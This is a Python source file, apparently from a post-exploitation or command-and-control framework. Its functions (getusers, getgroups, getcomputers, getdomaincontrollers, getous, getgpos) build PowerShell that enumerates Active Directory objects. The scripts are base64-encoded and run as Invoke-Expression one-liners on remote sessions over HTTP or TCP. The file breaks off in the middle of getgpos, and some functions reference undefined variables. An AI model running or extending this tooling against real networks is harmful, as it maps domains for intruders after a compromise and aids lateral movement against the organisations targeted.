import base64
from core.session_handlers import session_manager
from core import shell
from colorama import Style, Fore

brightgreen  = Style.BRIGHT + Fore.GREEN
brightyellow = Style.BRIGHT + Fore.YELLOW
brightred    = Style.BRIGHT + Fore.RED

def getusers(sid, os_type, username=None, domain=None, dc_ip=None):
    """
    getusers [-f <username>]
    - No username: lists all SamAccountName values.
    - With username: returns every AD property (Name: Value) for that account.
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    # Build appropriate PowerShell snippet

    if dc_ip:
        if username:
            # single-user, fetch all properties
            ps = f"""
$T = '{dc_ip}'
try {{
        $nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
    }} catch {{
        $nb = $T
    }}

try {{
  if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {{
      Get-ADUser -Identity '{username}' -Server $nb -Properties * | Format-List *
  }} else {{
      # native LDAP fallback
      $ldapPath = "LDAP://$nb"
      $root = ([ADSI] $ldapPath).defaultNamingContext
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = [ADSI]"LDAP://$root"
      $searcher.Filter = "(samAccountName={username})"
      $res = $searcher.FindOne()
      if ($res) {{
        foreach ($p in $res.Properties.PropertyNames) {{
          $val = $res.Properties[$p][0]
          Write-Output "$p`: $val"
        }}
      }}
  }}
}} catch {{
      $ldapPath = "LDAP://$nb"
      $root = ([ADSI] $ldapPath).defaultNamingContext
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = [ADSI]"LDAP://$root"
      $searcher.Filter = "(samAccountName={username})"
      $res = $searcher.FindOne()
      if ($res) {{
        foreach ($p in $res.Properties.PropertyNames) {{
          $val = $res.Properties[$p][0]
          Write-Output "$p`: $val"
        }}
      }}
}}
"""
        else:
            # no filter → list all SamAccountName
            ps = f"""

$T = '{dc_ip}'
try {{
        $nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
    }} catch {{
        $nb = $T
    }}

try {{
    if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {{
        Get-ADUser -Server $nb -Filter * | Select-Object -ExpandProperty SamAccountName
    }} else {{
        # native LDAP fallback
        $ldapPath = "LDAP://$nb"
        $root = ([ADSI] $ldapPath).defaultNamingContext
        $searcher  = New-Object System.DirectoryServices.DirectorySearcher(
            \"LDAP://$root\", \"(objectCategory=person)(objectClass=user)\"
        )
        $searcher.PageSize = 1000
        $results = $searcher.FindAll()
        foreach ($r in $results) {{
            $acct = $r.Properties[\"samaccountname\"][0]
            if ($acct) {{ Write-Output $acct }}
        }}
    }}
}} catch {{
    $ldapPath = "LDAP://$nb"
    $root = ([ADSI] $ldapPath).defaultNamingContext
    $searcher = New-Object System.DirectoryServices.DirectorySearcher(\"LDAP://$root\", \"(objectCategory=person)(objectClass=user)\")
    $searcher.PageSize = 1000
    $results = $searcher.FindAll()
    foreach ($r in $results) {{
        $acct = $r.Properties[\"samaccountname\"][0]
        if ($acct) {{ Write-Output $acct }}
    }}
}}
"""


    else:
        if username:
            # single-user, fetch all properties
            ps = f"""
try {{
  if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {{
      Get-ADUser -Identity '{username}' -Properties * | Format-List *
  }} else {{
      # native LDAP fallback
      $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = [ADSI]"LDAP://$root"
      $searcher.Filter = "(samAccountName={username})"
      $res = $searcher.FindOne()
      if ($res) {{
        foreach ($p in $res.Properties.PropertyNames) {{
          $val = $res.Properties[$p][0]
          Write-Output "$p`: $val"
        }}
      }}
  }}
}} catch {{
  $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = [ADSI]"LDAP://$root"
      $searcher.Filter = "(samAccountName={username})"
      $res = $searcher.FindOne()
      if ($res) {{
        foreach ($p in $res.Properties.PropertyNames) {{
          $val = $res.Properties[$p][0]
          Write-Output "$p`: $val"
        }}
      }}
}}
"""
        else:
            # no filter → list all SamAccountName
            ps = """
try {
    if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {
        Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
    } else {
        # native LDAP fallback
        $root      = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext
        $searcher  = New-Object System.DirectoryServices.DirectorySearcher(
            \"LDAP://$root\", \"(objectCategory=person)(objectClass=user)\"
        )
        $searcher.PageSize = 1000
        $results = $searcher.FindAll()
        foreach ($r in $results) {
            $acct = $r.Properties[\"samaccountname\"][0]
            if ($acct) { Write-Output $acct }
        }
    }
} catch {
    # on any error, repeat the LDAP fallback
    $root      = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext
    $searcher  = New-Object System.DirectoryServices.DirectorySearcher(
        \"LDAP://$root\", \"(objectCategory=person)(objectClass=user)\"
    )
    $searcher.PageSize = 1000
    $results = $searcher.FindAll()
    foreach ($r in $results) {
        $acct = $r.Properties[\"samaccountname\"][0]
        if ($acct) { Write-Output $acct }
    }
}
"""

    # Encode to one‐liner
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    # Dispatch
    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)

    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    else:
        return brightred + "[!] Unknown session transport!"

    return out or ""

def getgroups(sid, group=None, domain=None, dc_ip=None, members=None):
    """
    getgroups [-f <group>] [-d <domain>] [--dc-ip <ip>]
    - No args: lists all SamAccountNames of groups.
    - With group: returns every AD property (Name: Value) for that group.
    - With domain: target that AD domain.
    - With dc_ip: target that DC by IP (falls back to DNS → NetBIOS).
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    if dc_ip:
        dc_ip = dc_ip

    elif not dc_ip and domain:
        dc_ip = domain

    elif dc_ip and domain:
        dc_ip = domain

    if dc_ip and not domain:
        dns_preamble = f"""
$T = '{dc_ip}'
try {{
    $nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
}} catch {{
    $nb = $T
}}
"""
    
    if dc_ip and domain:
        dns_preamble = f"""

try {{
    $domain = '{domain}'
    try {{
    $nb = (Resolve-DnsName -Type SRV "_ldap._tcp.dc._msdcs.$domain" | Sort-Object Priority,Weight | Select-Object -First 1).NameTarget.TrimEnd('.')
    }} catch {{ 
            $T = '{dc_ip}'
            try {{
            $nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
        }} catch {{
            $nb = $T
        }}  
    }}
}} catch {{
    Write-Output "Failed to resolve DC!"
    break
}}
"""
    
    if domain:
        dns_preamble = f"""

$domain = '{domain}'
try {{
$nb = (Resolve-DnsName -Type SRV "_ldap._tcp.dc._msdcs.$domain" | Sort-Object Priority,Weight | Select-Object -First 1).NameTarget.TrimEnd('.')
}} catch {{ 
            Write-Output "Failed to resolve DC!"
            break
}}
"""
    
    server_arg = "-Server $nb"

    # Build the PS snippet based on which flags are set
    if dc_ip:
        if group and members:
            ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADGroupMember -ErrorAction SilentlyContinue) {{
      # Use the AD cmdlet if available
      $acct = (Get-ADGroupMember -Identity '{group}' {server_arg} | Select-Object -ExpandProperty SamAccountName)
      if ($acct) {{ Write-Output $acct }}
      else {{ Write-Output "No members found" }}
  }} else {{
      # LDAP fallback: pull the 'member' attribute and resolve each DN
      $ldapPath = "LDAP://$nb"
      $root     = ([ADSI] $ldapPath).defaultNamingContext
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = [ADSI]"LDAP://$root"
      $searcher.Filter     = "(samAccountName={group})"
      $grp = $searcher.FindOne()
      if ($grp) {{
        foreach ($m in $grp.Properties["member"]) {{
          $entry = [ADSI]"LDAP://$m"
          $acct  = $entry.Properties["samAccountName"][0]
          if ($acct) {{ Write-Output $acct }}
          else {{ Write-Output "No members found" }}
        }}
      }}
  }}
}} catch {{
  # On error, repeat the LDAP fallback
  $ldapPath = "LDAP://$nb"
  $root     = ([ADSI] $ldapPath).defaultNamingContext
  $searcher = New-Object System.DirectoryServices.DirectorySearcher
  $searcher.SearchRoot = [ADSI]"LDAP://$root"
  $searcher.Filter     = "(samAccountName={group})"
  $grp = $searcher.FindOne()
  if ($grp) {{
    foreach ($m in $grp.Properties["member"]) {{
      $entry = [ADSI]"LDAP://$m"
      $acct  = $entry.Properties["samAccountName"][0]
      if ($acct) {{ Write-Output $acct }}
      else {{ Write-Output "No members found" }}
    }}
  }}
}}
"""

        elif group:
            # DC‑IP + filter
            ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADGroup -ErrorAction SilentlyContinue) {{
      $outprop = (Get-ADGroup -Identity '{group}' {server_arg} -Properties * | Format-List *)
      if ($outprop) {{ Write-Output $outprop }}
      else {{ Write-Output "No members found" }}
  }} else {{
      $ldapPath = "LDAP://$nb"
      $root = ([ADSI] $ldapPath).defaultNamingContext
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = [ADSI]"LDAP://$root"
      $searcher.Filter = "(samAccountName={group})"
      $res = $searcher.FindOne()
      if ($res) {{
        foreach ($p in $res.Properties.PropertyNames) {{
          $val = $res.Properties[$p][0]
          if ($p) {{ Write-Output "$p`: $val" }}
          else {{ Write-Output "No members found" }}
        }}
      }}
  }}
}} catch {{
  # LDAP fallback again
  $ldapPath = "LDAP://$nb"
  $root = ([ADSI] $ldapPath).defaultNamingContext
  $searcher = New-Object System.DirectoryServices.DirectorySearcher
  $searcher.SearchRoot = [ADSI]"LDAP://$root"
  $searcher.Filter = "(samAccountName={group})"
  $res = $searcher.FindOne()
  if ($res) {{
    foreach ($p in $res.Properties.PropertyNames) {{
      $val = $res.Properties[$p][0]
      if ($p) {{ Write-Output "$p`: $val" }}
      else {{ Write-Output "No members found" }}
    }}
  }}
}}
"""
        else:
            # DC‑IP only → list all groups
            ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADGroup -ErrorAction SilentlyContinue) {{
      $outprop = (Get-ADGroup -Filter * {server_arg} | Select-Object -ExpandProperty SamAccountName)
      if ($outprop) {{ Write-Output $outprop }}
      else {{ Write-Output "No members found" }}
  }} else {{
      $ldapPath = "LDAP://$nb"
      $root = ([ADSI] $ldapPath).defaultNamingContext
      $searcher = New-Object System.DirectoryServices.DirectorySearcher(
          "LDAP://$root", "(objectCategory=group)"
      )
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
        $grp = $r.Properties["samaccountname"][0]
        if ($grp) {{ Write-Output $grp }}
        else {{ Write-Output "No members found" }}
      }}
  }}
}} catch {{
  # LDAP fallback again
  $ldapPath = "LDAP://$nb"
  $root = ([ADSI] $ldapPath).defaultNamingContext
  $searcher = New-Object System.DirectoryServices.DirectorySearcher(
      "LDAP://$root", "(objectCategory=group)"
  )
  $searcher.PageSize = 1000
  $results = $searcher.FindAll()
  foreach ($r in $results) {{
    $grp = $r.Properties["samaccountname"][0]
    if ($grp) {{ Write-Output $grp }}
    else {{ Write-Output "No members found" }}
  }}
}}
"""

    else:
        # no dc_ip → default RootDSE
        if group and members:
            ps = f"""
try {{
  if (Get-Command Get-ADGroupMember -ErrorAction SilentlyContinue) {{
      # Use the AD cmdlet if available
      $acct = (Get-ADGroupMember -Identity '{group}' | Select-Object -ExpandProperty SamAccountName)
      if ($acct) {{ Write-Output $acct }}
      else {{ Write-Output "No members found" }}
  }} else {{
      # LDAP fallback: pull the 'member' attribute and resolve each DN
      $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = [ADSI]"LDAP://$root"
      $searcher.Filter     = "(samAccountName={group})"
      $grp = $searcher.FindOne()
      if ($grp) {{
        foreach ($m in $grp.Properties["member"]) {{
          $entry = [ADSI]"LDAP://$m"
          $acct  = $entry.Properties["samAccountName"][0]
          if ($acct) {{ Write-Output $acct }}
          else {{ Write-Output "No members found" }}
        }}
      }}
  }}
}} catch {{
  # On error, repeat the LDAP fallback
  $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
  $searcher = New-Object System.DirectoryServices.DirectorySearcher
  $searcher.SearchRoot = [ADSI]"LDAP://$root"
  $searcher.Filter     = "(samAccountName={group})"
  $grp = $searcher.FindOne()
  if ($grp) {{
    foreach ($m in $grp.Properties["member"]) {{
      $entry = [ADSI]"LDAP://$m"
      $acct  = $entry.Properties["samAccountName"][0]
      if ($acct) {{ Write-Output $acct }}
      else {{ Write-Output "No members found" }}
    }}
  }}
}}
"""

        elif group:
            # filter only
            ps = f"""
try {{
  if (Get-Command Get-ADGroup -ErrorAction SilentlyContinue) {{
      $outprop = (Get-ADGroup -Identity '{group}' -Properties * | Format-List *)
      if ($outprop) {{ Write-Output $outprop }}
      else {{ Write-Output "No members found" }}
  }} else {{
      $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = [ADSI]"LDAP://$root"
      $searcher.Filter = "(samAccountName={group})"
      $res = $searcher.FindOne()
      if ($res) {{
        foreach ($p in $res.Properties.PropertyNames) {{
          $val = $res.Properties[$p][0]
          if ($p) {{ Write-Output "$p`: $val" }}
          else {{ Write-Output "No members found" }}
        }}
      }}
  }}
}} catch {{
  $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
  $searcher = New-Object System.DirectoryServices.DirectorySearcher
  $searcher.SearchRoot = [ADSI]"LDAP://$root"
  $searcher.Filter = "(samAccountName={group})"
  $res = $searcher.FindOne()
  if ($res) {{
    foreach ($p in $res.Properties.PropertyNames) {{
      $val = $res.Properties[$p][0]
      if ($p) {{ Write-Output "$p`: $val" }}
      else {{ Write-Output "No members found" }}
    }}
  }}
}}
"""
        else:
            # neither → list all
            ps = """
try {
  if (Get-Command Get-ADGroup -ErrorAction SilentlyContinue) {
      $outprop = (Get-ADGroup -Filter * | Select-Object -ExpandProperty SamAccountName)
      if ($outprop) { Write-Output $outprop }
      else { Write-Output "No members found" }
  } else {
      $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
      $searcher = New-Object System.DirectoryServices.DirectorySearcher(
          "LDAP://$root", "(objectCategory=group)"
      )
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {
        $grp = $r.Properties["samaccountname"][0]
        if ($grp) { Write-Output $grp }
        else { Write-Output "No members found" }
      }
  }
} catch {
  $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
  $searcher = New-Object System.DirectoryServices.DirectorySearcher(
      "LDAP://$root", "(objectCategory=group)"
  )
  $searcher.PageSize = 1000
  $results = $searcher.FindAll()
  foreach ($r in $results) {
    $grp = $r.Properties["samaccountname"][0]
    if ($grp) { Write-Output $grp }
    else { Write-Output "No members found" }
  }
}
"""

    # Encode to Base64 UTF‑16LE one‑liner
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
      "$ps = [System.Text.Encoding]::Unicode"
      f".GetString([Convert]::FromBase64String(\"{b64}\")); "
      "Invoke-Expression $ps"
    )

    # Dispatch
    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)

    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    else:
        return brightred + "[!] Unknown session transport!"

    if out:
        if "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain with the correct IP/domain"

        elif "No members found" in out and group:
            return brightred + f"[!] No members in {group}"

        else:
            return out

def getcomputers(sid, computer=None, domain=None, dc_ip=None):
    """
    getcomputers [-n <computer>] [-d <domain>] [--dc-ip <ip>]
    - No args: lists all SamAccountNames of computer objects.
    - With -n: returns every AD property (Name:Value) for that computer.
    - With -d / --dc-ip: target a specific domain or DC.
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    # Resolve DC name logic (same pattern you used for getusers/getgroups)
    if dc_ip:
        target = dc_ip

    elif domain:
        target = domain

    else:
        target = None

    if target:
        dns_preamble = connection_builder(dc_ip, domain)

        if "ERROR" in dns_preamble:
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain with the correct IP/domain"

    if target:
        server_arg = "-Server $nb"
        root = "$ldapPath = \"LDAP://$nb\"; $root = ([ADSI] $ldapPath).defaultNamingContext"

    else:
        dns_preamble = ""
        server_arg = ""
        root = "$root = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext"


    # Build the PowerShell snippet
    if computer:
        # single‐computer, fetch all properties
        ps_body = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADComputer -ErrorAction SilentlyContinue) {{
      Get-ADComputer -Identity '{computer}' {server_arg} -Properties * | Format-List *
  }} else {{
      {root}
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = [ADSI]"LDAP://$root"
      $searcher.Filter     = "(samAccountName={computer})"
      $res = $searcher.FindOne()
      if ($res) {{
        foreach ($p in $res.Properties.PropertyNames) {{
          $v = $res.Properties[$p][0]
          Write-Output "$p`: $v"
        }}
      }}
  }}
}} catch {{
  # fallback identical to above
  {root}
  $searcher = New-Object System.DirectoryServices.DirectorySearcher
  $searcher.SearchRoot = [ADSI]"LDAP://$root"
  $searcher.Filter     = "(samAccountName={computer})"
  $res = $searcher.FindOne()
  if ($res) {{
    foreach ($p in $res.Properties.PropertyNames) {{
      $v = $res.Properties[$p][0]
      Write-Output "$p`: $v"
    }}
  }}
}}
"""
    else:
        # no filter → list all computer names
        ps_body = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADComputer -ErrorAction SilentlyContinue) {{
      $comacct = (Get-ADComputer -Filter * {server_arg} | Select-Object -ExpandProperty SamAccountName)
      if ($comacct) {{ Write-Output $comacct }}
      else {{ Write-Output "No Computers Found" }}
  }} else {{
      {root}
      $searcher  = New-Object System.DirectoryServices.DirectorySearcher(
          "LDAP://$root","(objectCategory=computer)"
      )
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
          $n = $r.Properties["samaccountname"][0]
          if ($n) {{ Write-Output $n }}
          else {{ Write-Output "No Computers Found" }}
      }}
  }}
}} catch {{
  # repeat fallback
  {root}
  $searcher  = New-Object System.DirectoryServices.DirectorySearcher(
      "LDAP://$root","(objectCategory=computer)"
  )
  $searcher.PageSize = 1000
  $results = $searcher.FindAll()
  foreach ($r in $results) {{
      $n = $r.Properties["samaccountname"][0]
      if ($n) {{ Write-Output $n }}
      else {{ Write-Output "No Computers Found" }}
  }}
}}
"""

    # Base64‐encode and dispatch
    b64 = base64.b64encode(ps_body.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)
    
    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    else:
        return brightred + "[!] Unknown session transport!"

    if out:
        if "No Computers Found" in out:
            return brightred + "[!] No computers found!"

        elif "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain with the correct IP/domain"

        else:
            return out


def connection_builder(dc_ip=None, domain=None):
    if dc_ip and not domain:
        dns_preamble = f"""
$T = '{dc_ip}'
try {{
    $nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
}} catch {{
    $nb = $T
}}
"""
    
    if dc_ip and domain:
        dns_preamble = f"""

try {{
    $domain = '{domain}'
    try {{
    $nb = (Resolve-DnsName -Type SRV "_ldap._tcp.dc._msdcs.$domain" | Sort-Object Priority,Weight | Select-Object -First 1).NameTarget.TrimEnd('.')
    }} catch {{ 
            $T = '{dc_ip}'
            try {{
            $nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
        }} catch {{
            $nb = $T
        }}  
    }}
}} catch {{
    Write-Output "Failed to resolve DC!"
    break
}}
"""
    
    if domain:
        dns_preamble = f"""

$domain = '{domain}'
try {{
$nb = (Resolve-DnsName -Type SRV "_ldap._tcp.dc._msdcs.$domain" | Sort-Object Priority,Weight | Select-Object -First 1).NameTarget.TrimEnd('.')
}} catch {{ 
            Write-Output "Failed to resolve DC!"
            break
}}
"""
    
    if dns_preamble:
        return dns_preamble

    else:
        return "ERROR"


def getdomaincontrollers(sid, domain=None, dc_ip=None, enterprise=False):
    """
    getdomaincontrollers [-d <domain>] [--dc-ip <ip>] [-e, --enterprise]
    - No flags: lists all DC hostnames in the current domain.
    - -d/--dc-ip: target a specific domain or DC.
    - -e/--enterprise: enumerate DCs in every domain in the forest.
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    # figure out target for single-domain queries
    target = dc_ip or domain or None

    # preamble to resolve a single DC host
    if target:
        preamble = connection_builder(dc_ip, domain)
        if "ERROR" in dns_preamble:
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain with the correct IP/domain"

    
    if target:
        server_arg = "-Server $nb"
        if enterprise:
            root = "$ldapPath = \"LDAP://$nb\"; $forestRoot = ([ADSI] $ldapPath).configurationNamingContext"

        root = "$ldapPath = \"LDAP://$nb\"; $root = ([ADSI] $ldapPath).defaultNamingContext"

    else:
        preamble = ""
        server_arg = ""
        if enterprise:
            root = "$forestRoot = ([ADSI]\"LDAP://RootDSE\").configurationNamingContext"

        root = "([ADSI]\"LDAP://RootDSE\").defaultNamingContext"

    # build the main PS snippet
    if enterprise:
        ps = f"""
{preamble}
try {{
  if (Get-Command Get-ADForest -ErrorAction SilentlyContinue) {{
      $forest = Get-ADForest {server_arg}
      foreach ($d in $forest.Domains) {{
          $results = (Get-ADDomainController -Filter * -Server $d | Select-Object @{{ Name='HostName'; Expression={{ $_.HostName }} }})
          foreach ($r in $results) {{
            if ($r) {{ Write-Output $r }}
            else {{ Write-Output "Nothing Found" }}
          }}
      }}
  }}
  else {{
      
      {root}
      $searcher   = New-Object System.DirectoryServices.DirectorySearcher(
          "LDAP://$forestRoot",
          "(objectCategory=server)(userAccountControl:1.2.840.113556.1.4.803:=8192)"
      )
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
        $n = $r.Properties["dNSHostName"][0]
        if ($n) {{ Write-Output $n }}
        else {{ Write-Output "Nothing Found" }}
      }}
  }}
}}
catch {{
  
  {root}
  $searcher = New-Object System.DirectoryServices.DirectorySearcher(
      "LDAP://$forestRoot",
      "(objectCategory=server)(userAccountControl:1.2.840.113556.1.4.803:=8192)"
  )
  $searcher.PageSize = 1000
  $results = $searcher.FindAll()
  foreach ($r in $results) {{
    $n = $r.Properties["dNSHostName"][0]
    if ($n) {{ Write-Output $n }}
    else {{ Write-Output "Nothing Found" }}
  }}
}}
"""

    else:
        ps = f"""
{preamble}
try {{
  if (Get-Command Get-ADDomainController -ErrorAction SilentlyContinue) {{
      $controlacct = (Get-ADDomainController {server_arg} -Filter * | Select-Object -ExpandProperty HostName)
      if ($controlacct) {{ Write-Output $controlacct }}
      else {{ Write-Output "Nothing Found" }}
  }} else {{
      {root}
      $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root", "(objectCategory=server)(userAccountControl:1.2.840.113556.1.4.803:=8192)")
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
        $n = $r.Properties["dNSHostName"][0]
        if ($n) {{ Write-Output $n }}
        else {{ Write-Output "Nothing found" }}
      }}
  }}
}} catch {{
  {root}
  $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root", "(objectCategory=server)(userAccountControl:1.2.840.113556.1.4.803:=8192)")
  $searcher.PageSize = 1000
  $results = $searcher.FindAll()
  foreach ($r in $results) {{
    $n = $r.Properties["dNSHostName"][0]
    if ($n) {{ Write-Output $n }}
    else {{ Write-Output "Nothing found" }}
  }}
}}
"""

    # Base64‐encode & dispatch
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)

    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    if out:
        if "Nothing Found" in out:
            return brightred + "[!] Couldn't find any domain controllers!"

        elif "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain with the correct IP/domain"

        else:
            return out

def getous(sid, ou=None, domain=None, dc_ip=None):
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    # resolve target DC / domain exactly like getcomputers/getgroups
    target = dc_ip or domain or None

    if target:
        dns_preamble = connection_builder(dc_ip, domain)
        if dns_preamble == "ERROR":
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"

        server_arg = "-Server $nb"
        root_base   = "$ldapPath = \"LDAP://$nb\"; $root = ([ADSI] $ldapPath).defaultNamingContext"
    else:
        dns_preamble = ""
        server_arg   = ""
        root_base    = "$root = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext"

    # build the PS block
    if ou:
        ps_body = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADOrganizationalUnit -ErrorAction SilentlyContinue) {{
      $orgprint = (Get-ADOrganizationalUnit -Identity '{ou}' {server_arg} -Properties * | Format-List *)
      if ($orgprint) {{ Write-Output $orgprint }}
      else {{ Write-Output "Nothing Found" }}
  }} else {{
      {root_base}
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = [ADSI]"LDAP://$root"
      $searcher.Filter     = "(&(objectCategory=organizationalUnit)(ou={ou}))"
      $res = $searcher.FindOne()
      if ($res) {{
        foreach ($p in $res.Properties.PropertyNames) {{
          $v = $res.Properties[$p][0]
          if ($v) {{ Write-Output "$p`: $v" }}
          else {{ Write-Output "Nothing Found" }}
        }}
      }}
  }}
}} catch {{
  # fallback: repeat LDAP block
  {root_base}
  $searcher = New-Object System.DirectoryServices.DirectorySearcher
  $searcher.SearchRoot = [ADSI]"LDAP://$root"
  $searcher.Filter     = "(&(objectCategory=organizationalUnit)(ou={ou}))"
  $res = $searcher.FindOne()
  if ($res) {{
    foreach ($p in $res.Properties.PropertyNames) {{
      $v = $res.Properties[$p][0]
      if ($v) {{ Write-Output "$p`: $v" }}
      else {{ Write-Output "Nothing Found" }}
    }}
  }}
}}
"""
    else:
        ps_body = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADOrganizationalUnit -ErrorAction SilentlyContinue) {{
      $ous = (Get-ADOrganizationalUnit -Filter * {server_arg} | Select-Object -ExpandProperty DistinguishedName)
      if ($ous) {{ Write-Output $ous }} else {{ Write-Output "Nothing Found" }}
  }} else {{
      {root_base}
      $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root", "(objectCategory=organizationalUnit)")
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
        $dn = $r.Properties["distinguishedName"][0]
        if ($dn) {{ Write-Output $dn }} else {{ Write-Output "Nothing Found" }}
      }}
  }}
}} catch {{
  # fallback again
  {root_base}
  $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root", "(objectCategory=organizationalUnit)")
  $searcher.PageSize = 1000
  $results = $searcher.FindAll()
  foreach ($r in $results) {{
    $dn = $r.Properties["distinguishedName"][0]
    if ($dn) {{ Write-Output $dn }} else {{ Write-Output "Nothing Found" }}
  }}
}}
"""

    # Base64‐encode & dispatch
    b64 = base64.b64encode(ps_body.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)
    
    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)
    
    if out:
        if "Nothing Found" in out:
            return brightred + "[!] Didn't find any OUs!"

        elif "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain with the correct IP/domain"

        else:
            return out


def getgpos(sid, name=None, domain=None, dc_ip=None):
    """
    getgpos [-n <name>] [-d <domain>] [--dc-ip <ip>]
    - No args: lists all GPO DisplayNames.
    - With -n: returns every AD property (Name:Value) for that GPO.
    - With -d/--dc-ip: target a specific domain or DC.
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    target = dc_ip or domain or None

    if target:
        dns_preamble = connection_builder(dc_ip, domain)
        if dns_preamble == "ERROR":
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"

        server_arg = "-Server $nb"
        root = "$ldapPath = \"LDAP://$nb\"; $root = ([ADSI] $ldapPath).defaultNamingContext"

    else:
        dns_preamble = ""
        server_arg   = ""
        root = "$root = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext"
    
    # Build the PS snippet
    if name:
        # fetch properties for one GPO
        ps = f"""
{dns_preamble}
{root}
try {{
